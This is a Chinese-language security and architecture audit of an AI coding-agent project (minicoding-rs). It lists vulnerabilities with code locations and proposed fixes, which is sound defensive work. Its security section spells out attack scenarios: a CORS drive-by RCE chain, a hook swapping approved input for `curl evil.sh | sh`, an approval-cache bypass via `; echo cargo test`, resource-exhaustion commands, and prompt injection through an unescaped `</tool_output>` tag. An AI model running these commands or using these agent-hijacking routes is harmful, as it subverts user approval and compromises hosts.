# minicoding-rs 全面审查问题报告（2026-08-21，基线 v0.2.31）

> **本文地位**：对项目从零进行的第五次全面审查，**取代**此前四份审查/对比文档的分析结论
> （`review-report.md`、`improvement-design.md`、`minicoding-rs-深度对比与改进设计报告.md`、
> `minicoding-rs-代码级修改设计文档.md`——四者呈链式覆盖关系但均未标注取代状态，见 §5.6）。
>
> **审查方法**：五路并行源码级调研——①架构与模块边界（全量 Cargo.toml 矩阵 + core 全文通读）、
> ②安全（L0 约束 C-01..C-30 逐条实现层验证 + 攻击面推演）、③服务端/协议层/前端契约、
> ④文档漂移抽验（api/modules/data-model/design/features 对照代码）、⑤代码质量与测试基建。
> 所有结论均带 文件:行 证据。

---

## 0. 执行摘要

**总体评价**：项目的两条架构硬红线（core 无领域依赖、无循环依赖）守住了；trait 落位规整；
C-06 replay 强制、Landlock fail-closed、unsafe 纪律、覆盖率门禁（llvm-cov ≥80% 真实存在于 CI）
达到了文档承诺水平。**但安全暴露面存在两个"严重"级缺陷（HTTP server 零鉴权 + CORS 默认
Any 构成浏览器 drive-by RCE 链），以及一处使整个权限模型失效的编排缺口（Hook modify_input
后不复查策略）**。此外文档与代码的结构性漂移已达到会误导数据迁移开发者的程度。

### TOP 问题速览（按修复优先级）

| # | 问题 | 严重度 | 位置 |
|---|------|--------|------|
| 1 | HTTP server 全端点零鉴权，权限决策可被任意本机进程代答 | **严重** | server/http.rs |
| 2 | CORS 默认 Allow Any → 任意网页可驱动 localhost 完成 full-access RCE 链 | **严重** | http.rs:283-288 |
| 3 | PreToolUse Hook `modify_input` 后不重做策略检查，C-01/C-21 失守 | 高 | rt.rs:1384→1692→1450 |
| 4 | last-known-good 配置把明文 api_key 落盘且 0644 | 高 | config.rs:340-348 |
| 5 | 内置黑名单不覆盖 shell 类工具；预批准缓存子串匹配可拼接绕过 | 高 | builtin.rs:237-242,127-142 |
| 6 | shell.run 超时上限由 LLM 输入控制 + 无进程组清理 | 高 | shell/run.rs:100-103,164-167 |
| 7 | OS 沙箱无 seccomp/网络过滤，"沙箱内"命令可自由外传数据 | 高 | sandbox/Cargo.toml, macos.rs:172 |
| 8 | memory→storage 领域交叉依赖（唯一违反依赖红线处） | 中 | memory/Cargo.toml:13 |
| 9 | JSONL 格式文档与磁盘事实完全脱节（信封格式不存在） | 中 | data-model.md §2.2 |
| 10 | 架构守卫只护 core，领域层互查盲区放过了 #8 | 中 | core/tests/architecture.rs |

---

## 1. 安全问题（最高优先级）

### 1.1 【严重】HTTP server 零鉴权 + 权限代答

- **证据**：`crates/minicoding-server/src/http.rs:300-329` 路由表无任何 auth 中间件；
  `POST /sessions/{id}/permissions/{pid}`（http.rs:584-594）接受任意 decision；
  `GET /sessions`（http.rs:496-499）枚举全部会话。会话隔离仅依赖 ULID 不可猜测。
- **场景**：能访问端口的任何本机进程/容器邻居可读取全部会话内容、替用户批准其注入的命令、
  取消 turn——完整劫持 Agent。
- **修复方向**：默认绑定 127.0.0.1 已缓解外网暴露，但仍需：启动时生成 token 并要求
  `Authorization` 头（Web/Tauri 前端同源传递）；或至少提供 `--auth-token` 强制选项并在
  `serve` 文档标注风险。

### 1.2 【严重】CORS 默认 Allow Any → drive-by RCE 链

- **证据**：http.rs:283-288（空列表 = `allow_origin(Any)+methods(Any)+headers(Any)`），
  main.rs:62-64 注释自认"默认允许任意来源"——与 AGENTS.md §8.6"默认仅 localhost:*"
  **直接相反**。
- **场景**：用户浏览器中任意网页可向 127.0.0.1:8080 发预检并通过：
  `POST /sessions {"preset":"full-access"}` → `POST /messages` → 无弹窗在用户主机执行任意命令。
  叠加 1.3 的 full-access 免确认（http.rs:456-458 仅 tracing::warn），构成完整 drive-by RCE 链。
- **修复方向**：默认 origin 白名单仅 `http://localhost:*`；`--cors-origin` 显式放开。

### 1.3 【高】full-access preset 经 API 一个参数即生效，C-22 退化

- **证据**：http.rs:456-458（"API 传参视为显式选定"）与 478-485——无交互、无二次确认，
  仅日志红字。C-22 要求的"显式选定 + red 警告 + 二次确认"在 server 路径只剩一条日志。

### 1.4 【高】PreToolUse Hook `modify_input` 后不对修改后输入重做策略检查

- **证据链**：rt.rs:1384（policy.check 用原始 call）→ rt.rs:1689-1692（Hook 就地替换
  `effective_call.input`）→ rt.rs:1417（决策解析仍基于原始 verdict）→ rt.rs:1450（dispatch
  执行的是改后的 input）。
- **场景**：用户批准命令 X，Hook 把 input 改为 `curl evil.sh | sh` 后直接执行——内置黑名单
  （C-02）、路径策略（C-03 policy 层）对该输入从未生效；审计记录"批准了 X"而实际执行 Y，
  审计完整性同时破坏。代码注释（rt.rs:1654-1655）声称"仍经 sandbox_path 校验"，对命令类
  工具完全不成立。
- **修复方向**：modify_input 生效后对 effective_call 重跑 `policy.check`（含黑名单），
  决策变化则重新走 Prompter；审计记录最终生效输入。

### 1.5 【高】内置黑名单覆盖面与承诺不符

- **证据**：builtin.rs:237-242——`is_blacklisted` 仅覆盖 `fs.delete` 删 AGENTS.md/CLAUDE.md。
  `shell.run "rm AGENTS.md"`、`echo injected > AGENTS.md` 只走普通 Ask 且选项含
  `AllowAlways`（builtin.rs:325-332）——一次批准永久放行，C-23 失守于最普通的工具组合。
- **关联**：linux.rs:20-24 与 hardening.rs:14-16 声称".git 写保护由应用层黑名单补充"，
  但 builtin.rs 全文无 .git 逻辑（`vcs_protected_dirs` 未被引用）；Landlock 并集语义下
  `.git` 随 workdir 可写（macOS 靠 deny>allow 有效，Linux 实际失效）。WorkspaceWrite 下
  `fs.write .git/hooks/pre-commit` 可植入持久化 hook 后门。

### 1.6 【高】Plan.exit 预批准缓存子串匹配可拼接绕过

- **证据**：builtin.rs:127-142——`command_text.contains(&p.prompt)`（注释自称前缀匹配更严格，
  实现为任意位置子串匹配）。
- **场景**：缓存 `"cargo test"` 后提交 `git push --force; echo cargo test` → contains 命中 →
  无弹窗执行任意命令。标准审批缓存注入形态。
- **修复方向**：至少改为 shell 词法级首 token/完整命令规范化比对；理想是引用 dsh 的
  结构化命令解析。

### 1.7 【高】shell.run 资源上限形同虚设（C-07）

- run.rs:100-103：`timeout_ms` 由工具入参直接映射 Duration，schema 仅 `"minimum": 0`
  无上限——LLM 可传 `u64::MAX`。
- run.rs:164-167：注释自认"当前简化为单进程 kill；M4 将接入进程组"——超时只杀直接子进程，
  `sh -c "sleep 3600 & while :; do :; done &"` 留下孤儿进程树，反复调用即资源耗尽。
- run.rs:168-183：输出先全量入内存再截断（MAX_OUTPUT_CHARS=10_000 截断发生在
  wait_with_output 之后），超时窗口内 `cat /dev/urandom` 可打爆内存；web.fetch 同型
  （fetch.rs:111-130 全量 `text()` 后才截断）。

### 1.8 【高】OS 沙箱不含 syscall/网络过滤，第二道防线对外泄零作用

- **证据**：sandbox/Cargo.toml:19-22 自认 libseccomp 未接入（AGENTS.md 选型表要求接入）；
  Landlock ABI V3 仅文件系统（linux.rs:32-34）；Seatbelt profile 显式 `(allow network*)`
  （macos.rs:172）。
- **场景**：WorkspaceWrite"沙箱内"命令可自由 `curl` 外传 workdir 数据/访问元数据接口。
  与 tech-stack.md 承诺的沙箱能力不符，应在文档明确披露当前能力边界并排期 seccomp/网络白名单。

### 1.9 【中】信任边界落在远端自我声明上

- mcp/client/wrapper.rs:51-57：MCP 工具凭远程 server 自报 `readOnlyHint: true` 即标记
  `SideEffect::None`，进只读桶并行执行——全程不经 policy/prompter/审计（配合 rt.rs:1179-1184
  分桶逻辑）。被入侵的 MCP server 对实际有副作用的工具声明只读即可绕过整个 C-01 链。
- 另：未知工具分桶 fail-open（`is_none_or` 默认归只读桶，rt.rs:1180-1184），当前靠
  dispatch NotFound 兜底，属防御姿态问题。

### 1.10 【中】路径校验双实现漂移 + fs.write 越界 mkdir

- tools/lib.rs:11-12 声称"委托 minicoding-policy::path_sandbox，不重复实现"；实际上所有
  fs 工具用本地 `util::resolve_path`（util.rs:15-44），两者算法不同（policy 版回溯最长存在
  祖先，tools 版只归一一层父目录）。两套 C-03 语义独立演化即是漏洞温床。
- fs/write.rs:86-98：resolve_path 返回 NotFound 时对原始候选路径 parent 直接
  `create_dir_all`——结合 1.4 或自定义 policy 可在 workdir 外创建目录（如 `~/.ssh` 父目录）。

### 1.11 【中】凭证与敏感数据落盘面

- config.rs:340-348：LKG 配置在 `resolve_env_vars` 之后序列化——即使用户规范使用
  `env:` 引用，明文 key 仍复制到 `.last-known-good.toml` 且 `std::fs::write` 无 0600。
- 会话转录 `{id}.jsonl` 无权限控制（仅 audit.log 0600）：`shell.run` 的 `printenv`/
  `cat .env` 输出整段落盘（fs.read 脱敏只覆盖文件名匹配场景，read.rs:109）。
- http.rs:163-164：创建会话接受客户端传入 api_key，与 ndjson.rs:35"客户端不传凭证"声明不一致。

### 1.12 【中】`</tool_output>` 边界逃逸（C-05）

- providers/common/mod.rs:60-66：`wrap_tool_output` 不转义内容中的字面闭合标签，
  content 含 `</tool_output>` 时边界提前闭合（三个 provider 同型：openai.rs:268 等）。
  web.fetch 抓攻击者页面可实现跨边界 prompt injection。

### 1.13 其余（低）

- `/undo` 不记审计（interactive.rs:181-209；AGENTS.md §5.5 与 C-28 要求记录）。
- Windows 驱动单槽 `last_policy` 快照竞态（windows.rs:34-38）；`JOB_OBJECT_LIMIT_BREAKAWAY_OK`
  允许子进程脱离 Job；`is_hardened()` 在无文件系统隔离的情况下返回 true，doctor 报告高估防护。
- macOS Seatbelt profile 临时文件名可预测且 `fs::write` 跟随符号链接（macos.rs:106-112）。
- web.fetch 重定向后不复检 SSRF/DNS rebinding（fetch.rs:88-89）。
- NoopDriver 降级仅 warn 日志后继续（driver.rs:57-61），C-22 要求的用户显式确认在降级路径缺失。
- PermissionContext 恒为 `turn: 0, history: []`（rt.rs:1377-1378），策略无法做聚合判定。

### 1.14 验证通过项（正面确认）

C-06 replay 对副作用硬 Deny 且不可透传 ✅；Landlock `restrict_self` 校验 FullyEnforced、
fail-closed ✅；shell/Hook 子进程 `env_clear` + 白名单 ✅；CredentialResolver 仅内存 TTL、
Debug 脱敏 ✅；provider Debug 不泄 key ✅；audit.log 0600 ✅；unsafe 全部集中于平台 FFI
且均有 SAFETY 注释，无非必要 unsafe ✅；路径穿越/symlink 绝对越界有 proptest 覆盖 ✅。

---

## 2. 架构与模块边界

### 2.1 【高→中】core 名为"零实现"，实为最大 crate（13121 行，占 22%）

- hooks/trait_def.rs **2007 行**，其中 `HookRegistry::dispatch` 默认实现约 140 行完整分发算法
  （串行执行、超时包装、错误处置映射、含 C-21 安全裁决的 merge_decision、asyncRewake 白名单）——
  Hook 执行语义属领域逻辑，强制点却留在 core（trait_def.rs:495-682）。
- repair_dangling_tool_calls（model/message.rs:215-260）是完整消息修复算法藏在 model 层。
- M-08 死循环检测三件套（fingerprint/signature/is_repeating）内联 rt.rs（783-842），
  与压缩熔断、沙箱熔断并列第三套散落检测算法。
- PlanModeController 唯一真实现 PlanControllerHandle 在 core（rt.rs:2219-2253）——非 Noop
  兜底而是有状态真实现，违背 trait/实现对位原则。
- 手写 glob 匹配（trait_def.rs:161-197）违反"不自研 glob"选型表；modules.md:383 记录了相反
  决策——两份规范互相矛盾未收敛。

### 2.2 【中】memory→storage：唯一的领域交叉依赖

- memory/Cargo.toml:13 依赖 storage；session_sum.rs:222 直接读写 storage 的 SessionIndex。
  违反 AGENTS.md §3.2"领域 crate 经 core trait 解耦"。modules.md:355 还声称 memory 只依赖
  core——文档漂移掩盖了违规。摘要落盘应经 Storage trait 或专用 trait。

### 2.3 【中】架构守卫存在系统性盲区

- core/tests/architecture.rs 仅断言 core 不依赖领域 crate；**没有任何测试断言"领域 crate
  互不依赖""领域 crate 不依赖 frontend"**——§2.2 的违规正是从此盲区漏掉。
- 同时 core 依赖白名单已事实扩容至 17 项（architecture.rs:15-33），守卫注释仍称"与
  modules.md §1.4 一致"（声明 9 项）；其中 notify 是平台相关 FS 监听库，与"轻量无平台"
  措辞冲突。"轻量 core"约束实质放松且失去文档监督。

### 2.4 【中】组装点失控与 frontend 交叉

- "tools 是唯一组合层"实际由 cli/builder.rs、server/runtime_builder.rs、sdk 三处打破；
  server 实际依赖 10 个 workspace crate（文档写 3 个）。
- tui 依赖 cli 复用 build_runtime（tui/Cargo.toml:23），传递引入 clap/keyring/tar 等纯 CLI
  依赖；builder 组装应下沉共享层。
- desktop 依赖 core 直接读写 config.toml（modules.md:923 声称它不依赖 core）——桌面壳与
  sidecar 对配置文件双头访问是隐性共享状态。

### 2.5 feature gate 治理

- server `default = ["otel"]` vs cli otel 为 opt-in：两种默认哲学并存。
- server 的 `acp` 是死 feature（无 dep 映射、无 cfg 引用，acp.rs 恒编译），与 lsp 门控风格不一致。
- tools/Cargo.toml:33-42 整块注释掉的 optional 依赖残留（"M0 占位"至今未落实）。
- cli 默认带 serve/mcp 却不带 hooks/file-undo，组合不对称且无理由注记。

### 2.6 正面确认

无循环依赖；无领域 crate 反向依赖 tools；trait→实现位置抽查 15 项全部正确落位
（唯一例外见 PlanControllerHandle）；crate 粒度无失控（最大 tools 9744 行属组合层合理体量）。

---

## 3. 服务端 / 协议层 / 前端契约

1. 【中】HTTP handler DTO 完全游离于 ts-rs 导出链之外（http.rs:136-237 手写 Serialize），
   前端 client.ts:93-178 逐字段手写镜像——契约漂移高发区（CreateSessionBody 加字段只能人肉同步）。
2. 【中】generated/index.ts 头部标"AUTO-GENERATED"实为手工 barrel，漏导出 7 类型
   （Session/PromptOption/SideEffect 等）；直接后果是 client.ts:208 手写 PendingPermissionDto
   与生成的 PermissionPrompt 平行重复，违反 AGENTS.md §8.4"不手写双份"。
3. 【中】EventKind 混入 NDJSON 专用变体（SessionsListed/SessionRetrieved/CommandError，
   protocol/event.rs:90-100）污染通用 SSE 契约；前端 reducer 为它们写的分支是死代码
   （chatReducer.ts:168-172）。
4. 【中】ToolSchema.ts import 指向 generated 目录外的 crate 源码树绑定
   （../../../../minicoding-core/bindings/...），产物不自包含、超出 tsconfig include。
5. 【低】Session.ts `config_hash: bigint` 是类型谎言（wire 是 JSON number；event.rs:28 对 seq
   已做 ts(type="number") 特判，此处漏了）。
6. 【待验证】SSE 多客户端订阅同一会话行为、心跳机制、Last-Event-ID 三级回退的正确性
   有待专项并发测试；同一会话并发 POST messages 的语义未见文档约定。

---

## 4. 测试与代码质量

### 4.1 现状（正面为主）

- 测试总量健康：tools 305 / core 248 / providers 193 / storage 116 / policy 107 …
  全 workspace 约 1400+ 用例；proptest 用于路径沙箱与消息模型。
- **覆盖率门禁真实存在**：CI coverage job `cargo llvm-cov --fail-under-lines 80`，
  排除 tui/cli/server/desktop 的理由逐条注明（ci.yml:71-95）——高于多数同类项目的兑现度。
- 前端 0 处 `any`；M-14 后有 Vitest/MSW/快照基建。

### 4.2 问题

1. 【中】非测试代码 unwrap/expect 共 45 处。绝大多数是锁中毒 expect（可辩护），但
   session_mgr.rs 密集（303/323/333/349/371/386/534 七处）且部分无不变式注释，
   不符合 AGENTS.md §2.3"除有证明不会 panic 的注释"的要求。
2. 【中】provider 三胞胎重复：openai/anthropic/ollama 合计 3950 行，SSE 解析/请求构造/
   错误映射结构高度相似；公共层（common/）已有 sse.rs 但每家仍各自维护一份流循环。
   新增 provider 的边际成本与修 bug 的同步成本都高。
3. 【低】前端巨石组件：SetupDialog.tsx 527 行、WorkspacePanel.tsx 419 行、MessageList.tsx 361 行。
4. 【低】rt.rs 单文件 2335 行承担 Agent 循环+权限编排+hook 调用+熔断+热更新+事件持久化，
   建议按 §2.1 方向拆分而非继续追加。
5. 【低】配置热更是三方时序耦合（watcher std::thread debounce → broadcast → turn 边界消费），
   "变更下一 turn 生效"仅是隐式约定（M-12 已文档化，无类型层保障）；watcher 在非 FFI 场景
   用裸 std::thread 形式违反 §2.4（已有 why 注释，属已知偏离）。

---

## 5. 文档漂移（对照抽验结果）

1. 【中】**JSONL 格式描述整体过期（最严重漂移）**：data-model.md §2.2 展示的信封结构
   `{"v":1,"type":"message",...,"parent_uuid":...}` 与磁盘事实不符——jsonl.rs:232 直接裸序列化
   Message（无信封），字段名是 `metadata` 非 `meta`，不存在 parent_uuid/usage/tool_name/
   elapsed_ms/source=system·summarize；文档也未提 `_header` 行（jsonl.rs:226）。会误导迁移/
   回放工具开发者。
2. 【中】design.md §2.2 主循环伪代码仍是 6 步框架；实际主循环（rt.rs:689-903）含 turn_active
   guard、熔断 reset、M-12 配置热应用、有界迭代、M-08 软提醒、M-06 step 双写事件、
   select! 三路取消等约 10 个环节。
3. 【中】modules.md/AGENTS.md 的 core 依赖白名单（9 项）vs 实际 16+optional（§2.3）；
   AGENTS.md §3.6 仍要求"sandbox-run 不自研"而 tech-stack.md:216 宣布 sandbox-run 弃用、
   实际自研驱动（troubleshooting.md:65 还在教装 libseccomp）——三份文档三个说法，AGENTS.md
   红线已被正式决策推翻但未回收，后续 AI 助手按 AGENTS.md 行事将与现状冲突。
4. 【中】api.md §3.5 缺 `update_summary`（trait 第 5 方法）；SessionMeta 注释"80 字符截断"
   与实现不符。
5. 【中】features.md 统计分项错：合计 203 碰巧等于实数，但存储分项写 16（实 17）、Web 分项
   写 19（实 20，W-20 未入统计），分项相加=201≠203（违反 AGENTS.md §4.6）。
6. 【中】四份审查/对比文档链式覆盖而无 supersede 标注；README 两处"功能清单 192 项"、
   getting-started"14 个 crate"且通篇无 TUI，均为过期残留。
7. 【低】docs/api.md 用 trait_variant 风格展示签名、实际代码手写 BoxFuture——表述性差异。

---

## 6. 产品与定位层面

1. 四前端（CLI/TUI/Web/Desktop）并行维护：desktop/web 已到 W-20 且 release 流水线齐全，
   但 TUI 相对薄弱（2353 行、34 测试）——资源是否该如此摊开值得基于真实使用数据重估。
2. 版本号 0.2.x 语义与实际破坏性变更频率（存储 SCHEMA_VERSION 1→2、DTO 字段增删）不匹配，
   迁移指南仅在个别 commit message 出现，无 CHANGELOG。
3. 差异化定位（相对 Claude Code/Codex/dsh）散落在对比报告里，README 一句话定位仍偏泛。

---

## 7. 建议修复路线图

### P0（立即，发布阻断级）
1. server 鉴权：启动生成 token + Authorization 强制（或 --auth-token）；CORS 默认收敛
   localhost:*。（§1.1/§1.2）
2. modify_input 后对 effective_call 重跑 policy.check + 审计记最终输入。（§1.4）
3. LKG 写盘剥离 api_key 或 0600 + 不再存解析后明文。（§1.11）

### P1（近期一个迭代）
4. 黑名单补 shell 类保护（AGENTS.md/CLAUDE.md 写删、.git/hooks 写）+ 预批准缓存改规范化
   命令比对。（§1.5/§1.6）
5. shell.run timeout_ms 设上限 clamp + 进程组 killpg + 流式读取截断。（§1.7）
6. MCP readOnlyHint 降级为"需用户首次批准该 server 时勾选信任只读声明"或一律 Ask。
   （§1.9）
7. wrap_tool_output 转义闭合标签。（§1.12）
8. /undo 补审计。（§1.13）

### P2（中期结构性）
9. 架构守卫扩展为全 workspace manifest 白名单矩阵（先抓 memory→storage）。（§2.2/§2.3）
10. hooks dispatch 算法下沉 minicoding-hooks；rt.rs 拆出 repeat-guard/hook 编排模块；
    PlanControllerHandle 移交 policy。（§2.1）
11. HTTP DTO 进 ts-rs 导出链；index.ts 改由脚本生成；PendingPermissionDto 收敛到生成类型。
    （§3）
12. 路径校验收敛单实现（tools util::resolve_path 委托 path_sandbox）。（§1.10）
13. seccomp/网络过滤排期 + 沙箱能力边界写入 security.md。（§1.8）

### P3（文档治理）
14. 重写 data-model.md §2.2 按真实磁盘格式；design.md §2.2 伪代码补齐至实际环节数；
    回收 AGENTS.md §3.6 sandbox-run 条目。（§5）
15. 四份旧报告头部加"Superseded by 本报告"；features.md 分项修正；README/getting-started
    数字刷新。（§5.6/§5.5/§5.5）

---

## 附：审查覆盖说明

- 本报告基于静态源码调研与文档对照，未做动态渗透测试；§3 的 SSE 并发语义、§1.13 的
  NonInteractivePrompter fallback 语义标注为待专项验证。
- 五路调研的证据清单已在各节内联（文件:行），复核成本可控。
